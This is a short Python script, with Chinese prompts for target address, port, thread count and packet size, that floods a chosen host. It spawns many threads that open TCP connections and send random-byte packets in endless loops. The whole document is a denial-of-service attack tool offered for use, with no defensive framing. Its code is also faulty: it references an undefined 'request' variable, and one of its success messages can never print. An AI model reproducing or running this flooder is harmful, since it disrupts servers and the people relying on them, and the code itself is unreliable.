import random, socket, threading

ip = str(input("地址："))
port = int(input("端口："))
threads = int(input("线程数："))
bit =int(input("包大小："))

def run():
    data = random._urandom(bit)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            while True:
                s.send(data)
                s.send(str.encode(request))
            print(f"成功发送=> {ip}")
        except :
            print(f"发送失败 => {ip}")
            s.close()

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
